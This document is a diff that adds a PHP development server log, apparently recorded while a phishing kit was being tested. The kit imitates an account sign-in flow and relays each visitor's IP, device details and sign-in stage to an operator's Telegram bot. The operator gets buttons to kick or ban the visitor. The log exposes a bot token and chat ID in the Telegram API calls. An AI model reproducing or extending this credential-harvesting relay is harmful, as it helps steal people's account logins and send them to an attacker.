@@ -1,0 +1,39 @@
+[Wed Mar 25 11:50:09 2026] PHP 8.2.23 Development Server (http://0.0.0.0:5000) started
+[Wed Mar 25 11:50:10 2026] 127.0.0.1:55610 Accepted
+[Wed Mar 25 11:50:10 2026] 127.0.0.1:55610 [302]: GET /
+[Wed Mar 25 11:50:10 2026] 127.0.0.1:55610 Closing
+[Wed Mar 25 11:50:10 2026] 127.0.0.1:55620 Accepted
+[Wed Mar 25 11:50:10 2026] 127.0.0.1:55620 [302]: GET /
+[Wed Mar 25 11:50:10 2026] 127.0.0.1:55620 Closing
+[Wed Mar 25 11:50:10 2026] 127.0.0.1:55622 Accepted
+[Wed Mar 25 11:50:11 2026] [telegram_post_json] https://api.telegram.org/bot8754117712:AAGxakCtDIcLBLbxiMK905lKnXaZ5uw5ygY/sendMessage {"chat_id":"6044653279","text":"<blockquote>🟢🇽🇽🖥️ <b> <code>127.0.0.1<\/code> <\/b><\/blockquote><blockquote><b>*️⃣ Action: Please choose a command<\/b><\/blockquote> \n<b>COUNTRY:<\/b> XX\n<b>ISP:<\/b> Unknown ISP\n<b>ORG:<\/b> Unknown Organization\n<b>ASN:<\/b> AS0000 Unknown\n<b>DEVICE:<\/b> Desktop\n<b>BROWSER:<\/b> \n<b>OS:<\/b> Linux\n<b>USER AGENT:<\/b> <span class=\"tg-spoiler\">Mozilla\/5.0 (X11; Linux x86_64) AppleWebKit\/537.36 (KHTML, like Gecko) HeadlessChrome\/140.0.0.0 Safari\/537.36<\/span>","parse_mode":"HTML","reply_markup":{"inline_keyboard":[[{"text":"🔃 Waiting for response...","callback_data":"c0901983c44178d3161e9340fd979c26 loading"}]]}}
+[Wed Mar 25 11:50:11 2026] 127.0.0.1:55622 [302]: GET /accounts/
+[Wed Mar 25 11:50:11 2026] 127.0.0.1:55622 Closing
+[Wed Mar 25 11:50:11 2026] 127.0.0.1:55630 Accepted
+[Wed Mar 25 11:50:11 2026] 127.0.0.1:55630 [404]: GET /accounts/
+[Wed Mar 25 11:50:11 2026] 127.0.0.1:55630 Closing
+[Wed Mar 25 11:50:11 2026] 127.0.0.1:55640 Accepted
+[Wed Mar 25 11:50:11 2026] [telegram_post_json] https://api.telegram.org/bot8754117712:AAGxakCtDIcLBLbxiMK905lKnXaZ5uw5ygY/editMessageText {"chat_id":"6044653279","message_id":67,"text":"<blockquote>🟢🇽🇽🖥️ <b> <code>127.0.0.1<\/code> <\/b><\/blockquote><blockquote><b>👁️ Sign in - Email or phone<\/b><\/blockquote> \n<b>COUNTRY:<\/b> XX\n<b>ISP:<\/b> Unknown ISP\n<b>ORG:<\/b> Unknown Organization\n<b>ASN:<\/b> AS0000 Unknown\n<b>DEVICE:<\/b> Desktop\n<b>BROWSER:<\/b> \n<b>OS:<\/b> Linux\n<b>USER AGENT:<\/b> <span class=\"tg-spoiler\">Mozilla\/5.0 (X11; Linux x86_64) AppleWebKit\/537.36 (KHTML, like Gecko) HeadlessChrome\/140.0.0.0 Safari\/537.36<\/span>\n\n<blockquote><b>👤 USERNAME (0️⃣)<\/b> <\/blockquote><blockquote>🔄️<\/blockquote>","parse_mode":"HTML","reply_markup":{"inline_keyboard":[[{"text":"❕KICK USER❕","callback_data":"c0901983c44178d3161e9340fd979c26 kick_user"},{"text":"❗BAN USER❗","callback_data":"c0901983c44178d3161e9340fd979c26 ban_user"}]]}}
+[Wed Mar 25 11:50:12 2026] 127.0.0.1:55640 [200]: GET /accounts/user.php
+[Wed Mar 25 11:50:12 2026] 127.0.0.1:55640 Closing
+[Wed Mar 25 11:50:15 2026] 127.0.0.1:55728 Accepted
+[Wed Mar 25 11:50:15 2026] 127.0.0.1:55732 Accepted
+[Wed Mar 25 11:50:15 2026] 127.0.0.1:55742 Accepted
+[Wed Mar 25 11:50:15 2026] 127.0.0.1:55728 [200]: GET /accounts/css/index.css
+[Wed Mar 25 11:50:15 2026] 127.0.0.1:55732 [200]: GET /accounts/js/jquery-3.6.0.min.js
+[Wed Mar 25 11:50:15 2026] 127.0.0.1:55742 [200]: GET /accounts/js/log.js
+[Wed Mar 25 11:50:15 2026] 127.0.0.1:55728 Closing
+[Wed Mar 25 11:50:15 2026] 127.0.0.1:55732 Closing
+[Wed Mar 25 11:50:15 2026] 127.0.0.1:55742 Closing
+[Wed Mar 25 11:50:15 2026] 127.0.0.1:55746 Accepted
+[Wed Mar 25 11:50:15 2026] 127.0.0.1:55746 [200]: GET /accounts/media/7611770.png
+[Wed Mar 25 11:50:15 2026] 127.0.0.1:55746 Closing
+[Wed Mar 25 11:50:15 2026] 127.0.0.1:55756 Accepted
+[Wed Mar 25 11:50:15 2026] 127.0.0.1:55756 [200]: GET /accounts/media/7611770.png
+[Wed Mar 25 11:50:15 2026] 127.0.0.1:55756 Closing
+[Wed Mar 25 11:50:44 2026] 127.0.0.1:60958 Accepted
+[Wed Mar 25 11:50:44 2026] 127.0.0.1:60958 [404]: GET /accounts/
+[Wed Mar 25 11:50:44 2026] 127.0.0.1:60958 Closing
+[Wed Mar 25 11:50:45 2026] 127.0.0.1:60990 Accepted
+[Wed Mar 25 11:50:45 2026] 127.0.0.1:60990 [404]: GET /accounts/
+[Wed Mar 25 11:50:45 2026] 127.0.0.1:60990 Closing
